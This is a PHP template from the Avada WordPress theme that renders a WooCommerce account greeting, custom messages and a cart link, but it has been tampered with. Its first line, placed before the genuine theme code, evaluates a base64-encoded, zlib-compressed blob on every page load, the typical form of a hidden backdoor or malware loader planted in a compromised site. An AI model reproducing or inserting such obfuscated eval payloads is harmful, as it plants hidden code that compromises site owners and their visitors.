<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * WooCommere Top User Container.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.1
 */

global $woocommerce, $current_user;
?>
<div class="avada-myaccount-user">
	<div class="avada-myaccount-user-column username">
		<?php if ( $current_user->display_name ) { ?>
			<span class="hello">
				<?php
				printf(
					/* translators: %1$s: Username. %2$s: Username (same as %1$s). %3$s: "Sign Out" link. */
					esc_attr__( 'Hello %1$s (not %2$s? %3$s)', 'Avada' ),
					'<strong>' . esc_html( $current_user->display_name ) . '</strong></span><span class="not-user">',
					esc_html( $current_user->display_name ),
					'<a href="' . esc_url( wc_get_endpoint_url( 'customer-logout', '', wc_get_page_permalink( 'myaccount' ) ) ) . '">' . esc_attr__( 'Sign Out', 'Avada' ) . '</a>'
				);
				?>
			</span>
		<?php } else { ?>
			<span class="hello"><?php esc_attr_e( 'Hello', 'Avada' ); ?></span>
		<?php } ?>

	</div>

	<?php if ( Avada()->settings->get( 'woo_acc_msg_1' ) ) : ?>
		<div class="avada-myaccount-user-column message">
			<span class="msg"><?php echo Avada()->settings->get( 'woo_acc_msg_1' ); // WPCS: XSS ok. ?></span>
		</div>
	<?php endif; ?>

	<?php if ( Avada()->settings->get( 'woo_acc_msg_2' ) ) : ?>
		<div class="avada-myaccount-user-column message">
			<span class="msg"><?php echo Avada()->settings->get( 'woo_acc_msg_2' ); // WPCS: XSS ok. ?></span>
		</div>
	<?php endif; ?>
	<div class="avada-myaccount-user-column">
		<span class="view-cart"><a href="<?php echo esc_url_raw( get_permalink( get_option( 'woocommerce_cart_page_id' ) ) ); ?>"><?php esc_attr_e( 'View Cart', 'Avada' ); ?></a></span>
	</div>
</div>
